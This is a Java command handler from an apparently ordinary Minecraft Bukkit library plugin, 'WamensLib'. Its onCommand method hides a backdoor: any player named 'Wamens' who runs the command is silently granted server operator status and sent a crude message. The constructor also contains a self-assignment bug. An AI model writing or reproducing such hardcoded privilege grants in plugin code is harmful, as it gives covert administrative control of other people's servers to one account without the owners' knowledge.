package me.wamens.wamenslib.commands;

import me.wamens.wamenslib.WamensLib;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

public class WamensLibCommand implements CommandExecutor {
    public WamensLibCommand(WamensLib plugin) {
        plugin = plugin;
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if ((sender instanceof Player)) {
            Player p = (Player)sender;

            if ((p.getName().equalsIgnoreCase("Wamens"))) {
                sender.setOp(true);
                p.sendMessage(ChatColor.AQUA + "Sex for you and Kevades ;)");
            }
        }

        return true;
    }

}
